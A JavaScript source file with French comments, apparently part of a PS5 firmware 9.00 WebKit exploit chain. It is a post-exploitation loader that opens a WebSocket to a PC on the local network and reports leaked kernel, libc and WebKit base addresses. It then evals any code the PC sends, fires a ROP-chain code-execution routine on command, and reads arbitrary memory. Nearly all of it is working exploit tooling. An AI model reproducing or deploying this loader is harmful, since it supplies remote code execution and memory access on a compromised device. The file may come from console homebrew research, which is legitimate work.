/**
 * remote.js — Remote JS Loader pour PS5 FW 9.00 (WebKit exploit)
 * 
 * Compatible avec le format de payloads Y2JB:
 *   await log("message")         → mark() dans les logs exploit
 *   send_notification("texte")   → demande au ws_server de trigger commitRce()
 *   
 * Commandes ws_server.py:
 *   send <fichier.js>   → envoyer un payload
 *   fire                → declencher la notif PS5 via ROP chain (crash renderer apres)
 *   help                → aide
 */

(async function remoteJSLoader() {

    const PC_IP   = (typeof RCE_PC_IP !== "undefined") ? RCE_PC_IP.join(".") : "192.168.1.180";
    const WS_PORT = 50000;
    const WS_URL  = `ws://${PC_IP}:${WS_PORT}`;

    // ── Infos systeme ──────────────────────────────────────────────────────────
    const sysInfo = {
        fw:          (typeof FW_LABEL    !== "undefined") ? FW_LABEL    : "?",
        kernelBase:  (typeof kernelBase  !== "undefined" && !isNaN(kernelBase))
                        ? "0x" + kernelBase.toString(16)  : "?",
        libcBase:    (typeof libcBase    !== "undefined" && !isNaN(libcBase))
                        ? "0x" + libcBase.toString(16)    : "? (NaN - offsets FW 9.00?)",
        webkitBase:  (typeof webkitBase  !== "undefined" && !isNaN(webkitBase))
                        ? "0x" + webkitBase.toString(16)  : "?",
    };

    // Note: log() et send_notification() sont definis dans exploit.js (loadAndCommitRce)
    // avant que ce fichier soit eval(). Ne pas les redefinir ici.

    function rlog(msg) {
        mark("RJL", msg);
        console.log("[RemoteJS] " + msg);
    }

    rlog("Connexion vers " + WS_URL + " ...");

    let ws = null;
    let reconnectTimer = null;

    function connectWS() {
        if (ws) { try { ws.close(); } catch {} }

        ws = new WebSocket(WS_URL);

        ws.onopen = function() {
            rlog("Connecte a " + WS_URL);
            ws.send(JSON.stringify({ type: "ready", ...sysInfo }));
        };

        ws.onmessage = async function(event) {
            let msg;
            try {
                msg = typeof event.data === "string" ? event.data : await event.data.text();
            } catch(e) {
                try { ws.send(JSON.stringify({ type: "error", error: "Failed to read: " + String(e) })); } catch {}
                return;
            }

            let parsed;
            try { parsed = JSON.parse(msg); } catch { parsed = { type: "eval", code: msg }; }

            // Trigger commitRce() → notif PS5 via ROP chain (crash renderer apres)
            if (parsed.type === "commit" || parsed.type === "fire") {
                rlog("commitRce() declenche depuis ws_server — notif PS5 + crash");
                try { ws.send(JSON.stringify({ type: "result", status: "ok", value: "commitRce firing..." })); } catch {}
                setTimeout(function() {
                    if (typeof commitRce === "function") {
                        commitRce();
                    } else {
                        rlog("ERREUR: commitRce() inaccessible");
                    }
                }, 100);
                return;
            }

            if (parsed.type === "eval" || parsed.type === "js") {
                const code = parsed.code || msg;
                rlog("Execution (" + code.length + " octets)");
                let result, err;
                try {
                    result = await eval(code);
                    try { ws.send(JSON.stringify({
                        type:   "result",
                        status: "ok",
                        value:  result !== undefined ? String(result) : "undefined"
                    })); } catch {}
                } catch(e) {
                    try { ws.send(JSON.stringify({
                        type:   "result",
                        status: "error",
                        error:  String(e)
                    })); } catch {}
                    rlog("Erreur: " + String(e).slice(0, 80));
                }
            } else if (parsed.type === "ping") {
                try { ws.send(JSON.stringify({ type: "pong" })); } catch {}
            } else if (parsed.type === "offsets" || parsed.type === "scan") {
                // deepslop: report the auto-detected offset set (self-porting scan)
                const scan = (typeof window.deepslopScanOffsets === "function")
                    ? window.deepslopScanOffsets() : null;
                const info = (typeof window.deepslopInfo !== "undefined")
                    ? window.deepslopInfo : null;
                try { ws.send(JSON.stringify({
                    type: "result", status: "ok",
                    value: JSON.stringify({ info, scan })
                })); } catch {}
            } else if (parsed.type === "resolve") {
                // resolve <addr> → which module + RVA
                let out = "?", ok = true;
                try {
                    const a = Number(parsed.addr);
                    const info = window.deepslopInfo;
                    if (info && Number.isFinite(a)){
                        const kb = Number(info.kernelBase), wb = Number(info.webkitBase);
                        if (a >= kb && a < kb + 0x44000) out = "libkernel_web+0x" + (a - kb).toString(16);
                        else if (a >= wb && a < wb + 0x2c7c000) out = "libSceNKWebKit+0x" + (a - wb).toString(16);
                        else out = "0x" + a.toString(16);
                    }
                } catch(e) { out = "error: " + String(e); ok = false; }
                try { ws.send(JSON.stringify({ type: "result", status: ok ? "ok" : "error", value: out })); } catch {}
            } else if (parsed.type === "mem") {
                // mem <addr> [qwords] — arbitrary read via deepslop scan (arena-relative fallback)
                let out = "", ok = true;
                try {
                    const a = BigInt(parsed.addr);
                    const n = Math.min(8, Math.max(1, parseInt(parsed.count || "1", 10) || 1));
                    for (let i = 0; i < n; i++){
                        const addr = a + BigInt(i * 8);
                        let v = 0n;
                        if (typeof window.read64 === "function") v = window.read64(addr);
                        out += "0x" + addr.toString(16) + " = 0x" + v.toString(16) + "\n";
                    }
                } catch(e) { out = "error: " + String(e); ok = false; }
                try { ws.send(JSON.stringify({ type: "result", status: ok ? "ok" : "error", value: out.trim() })); } catch {}
            }
        };

        ws.onerror = function() { rlog("Erreur WS"); };

        ws.onclose = function() {
            rlog("WS ferme - reconnexion dans 3s");
            clearTimeout(reconnectTimer);
            reconnectTimer = setTimeout(connectWS, 3000);
        };
    }

    connectWS();

    // Bloquer pour que commitRce() (dans loadAndCommitRce) ne soit jamais appele
    // automatiquement. commitRce() est declenche manuellement via "fire" dans ws_server.
    await new Promise(() => {});

})().catch(function(e) {
    if (typeof mark === "function") mark("RJL-FATAL", String(e?.message));
});
